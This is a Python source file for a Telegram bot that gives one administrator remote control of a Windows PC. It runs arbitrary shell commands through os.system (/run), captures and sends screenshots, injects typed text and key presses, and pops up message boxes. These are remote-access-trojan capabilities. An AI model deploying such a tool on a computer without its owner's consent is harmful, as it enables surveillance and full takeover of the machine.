import telebot
from telebot import types
import os
import pyautogui
from pynput.keyboard import Controller, Key
import ctypes

keyboard = Controller()

TOKEN = "tg: @howoox" #bot token
ADMIN_ID = 12345678 #your id

bot = telebot.TeleBot(TOKEN)
print("bot was enabled")



@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return
    bot.send_message(
        message.chat.id,
        "write /help for more commands\nCEO: @hidlow"
    )


@bot.message_handler(commands=['help'])
def help_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return
    text = """
/help
/scr
/run
/write
/key
/notify
    """
    bot.reply_to(message, text)

@bot.message_handler(commands=['run'])
def run_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    cmd = message.text.replace("/run ", "").strip()
    if not cmd:
        bot.reply_to(message, "Укажи команду после /run.")
        return

    os.system(cmd)
    print(f"выполнена команда /run {cmd}")
    bot.reply_to(message, f"Команда выполнена: {cmd}")


# Команда для скриншота
@bot.message_handler(commands=['scr'])
def screenshot_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    screenshot = pyautogui.screenshot()
    path = "screen.png"
    screenshot.save(path)

    with open(path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)

    print("выполнена команда: scr")

    os.remove(path)

@bot.message_handler(commands=['write'])
def write_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    text = message.text.replace("/write ", "").strip()
    if not text:
        bot.reply_to(message, "Укажи текст после /write.")
        return

    keyboard.type(text)
    print(f"выполнена команда: write {text}")
    bot.reply_to(message, f"Написано: {text}")

@bot.message_handler(commands=['key'])
def key_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    key_text = message.text.replace("/key ", "").strip()
    if not key_text:
        bot.reply_to(message, "Укажи клавишу после /key (например: enter, space, a, ctrl+c).")
        return

    try:
        special_keys = {
            "enter": Key.enter,
            "space": Key.space,
            "tab": Key.tab,
            "shift": Key.shift,
            "ctrl": Key.ctrl,
            "alt": Key.alt,
            "backspace": Key.backspace,
            "esc": Key.esc,
            "up": Key.up,
            "down": Key.down,
            "left": Key.left,
            "right": Key.right,
            "f1": Key.f1,
            "f2": Key.f2,
            "f3": Key.f3,
            "f4": Key.f4,
            "f5": Key.f5,
            "f11": Key.f11,
            "f12": Key.f12,
        }

        if "+" in key_text:
            combo = key_text.split("+")
            keys = [special_keys.get(k.lower(), k) for k in combo]
            for k in keys:
                keyboard.press(k)
            for k in reversed(keys):
                keyboard.release(k)
        else:
            key = special_keys.get(key_text.lower(), key_text)
            keyboard.press(key)
            keyboard.release(key)

        bot.reply_to(message, f"Нажата клавиша: {key_text}")
        print(f"выполнена команда: /key {key_text}")

    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")


notify_icons = {
    "info": 0x40,      #Информация
    "warning": 0x30,   #Внимание
    "error": 0x10,     #Ошибка
    "question": 0x20   #Вопрос
}

@bot.message_handler(commands=['notify'])
def notify_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "пример: /notify [info|warning|error|question] [текст]")
        return

    icon_type = parts[1].lower()
    text = parts[2]

    icon_code = notify_icons.get(icon_type, 0x10)

    # Создаём всплывающее окно
    ctypes.windll.user32.MessageBoxW(0, text, " ", icon_code)

    bot.reply_to(message, f"уведомление показано: {text}")
    print(f"выполнена команда: /notify {icon_type} {text}")

bot.polling(none_stop=True)